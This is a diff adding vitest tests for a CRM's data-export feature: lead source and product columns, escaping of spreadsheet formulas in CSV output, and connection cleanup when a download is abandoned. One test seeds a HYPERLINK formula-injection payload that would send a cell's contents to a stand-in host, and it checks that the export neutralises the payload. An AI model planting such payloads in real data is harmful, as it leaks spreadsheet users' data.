@@ -1,10 +1,12 @@
 import { generateKeyPairSync } from "node:crypto";
+import archiver from "archiver";
 import ExcelJS from "exceljs";
 import { unzipSync, strFromU8 } from "fflate";
 import Papa from "papaparse";
 import { ALL_GRANTS, rawPublicKey, signLicence, type LicenceStateName } from "@lume/core";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { createHarness, type AuthedClient, type Harness } from "../../test/harness";
+import { produceExport } from "./service";
 
 const server = generateKeyPairSync("ed25519");
 const INSTANCE = "LUME-TEST-0003";
@@ -155,6 +157,62 @@ describe("export all data (L-A Task 4)", () => {
     );
     const { files } = await download();
     expect(csv(files, "leads.csv").filter((l) => l.Name?.startsWith("Bulk ")).length).toBe(2500);
+  });
+
+  it("leads carry their source, product and external reference", async () => {
+    const src = (
+      await h.queryAll<{ id: string }>(
+        "INSERT INTO lead_sources (id, type, name) VALUES (gen_random_uuid(), 'manual', 'Walk-ins') RETURNING id",
+      )
+    )[0]!.id;
+    const product = (
+      await h.queryAll<{ id: string }>(
+        "INSERT INTO products (id, name) VALUES (gen_random_uuid(), 'Annual plan') RETURNING id",
+      )
+    )[0]!.id;
+    const lead = await h.seedLead({ ownerId: null, name: "Sourced Lead" });
+    await h.queryAll(
+      "UPDATE leads SET source_id = $2, product_id = $3, external_ref = 'SHEET-42' WHERE id = $1",
+      [lead, src, product],
+    );
+    const { files } = await download();
+    expect(csv(files, "leads.csv").find((l) => l.Name === "Sourced Lead")).toMatchObject({
+      Source: "Walk-ins",
+      Product: "Annual plan",
+      "External ref": "SHEET-42",
+    });
+  });
+
+  it("a cell that a spreadsheet would run as a formula is kept as text", async () => {
+    await h.seedLead({ ownerId: null, name: '=HYPERLINK("https://x.test/?"&B2,"Open")' });
+    const { files } = await download();
+    const text = strFromU8(files["leads.csv"]!);
+    expect(text).not.toMatch(/(^|,)"?=HYPERLINK/m);
+    expect(csv(files, "leads.csv").some((l) => l.Name === `'=HYPERLINK("https://x.test/?"&B2,"Open")`)).toBe(
+      true,
+    );
+  });
+
+  it("a download abandoned half way lets go of its database connection", async () => {
+    const zip = archiver("zip", { zlib: { level: 0 }, highWaterMark: 1024 });
+    // Nobody reads the zip: the export stalls on its first full buffer, as a closed browser leaves it.
+    const ac = new AbortController();
+    const done = produceExport({ pool: h.pool, userId: repId, zip, signal: ac.signal, log: h.app.log });
+    await new Promise((r) => setTimeout(r, 500));
+    // Asked as the same role, so its sessions' states are visible.
+    const idleInTx = async () =>
+      (
+        await h.pool.query<{ n: number }>(
+          "SELECT count(*)::int AS n FROM pg_stat_activity WHERE datname = current_database() AND state = 'idle in transaction'",
+        )
+      ).rows[0]!.n;
+    expect(await idleInTx()).toBeGreaterThanOrEqual(1);
+    ac.abort();
+    await Promise.race([
+      done,
+      new Promise((_, no) => setTimeout(() => no(new Error("still waiting")), 5000)),
+    ]);
+    expect(await idleInTx()).toBe(0);
   });
 
   it("works in every licence state — clients always get their data out", async () => {
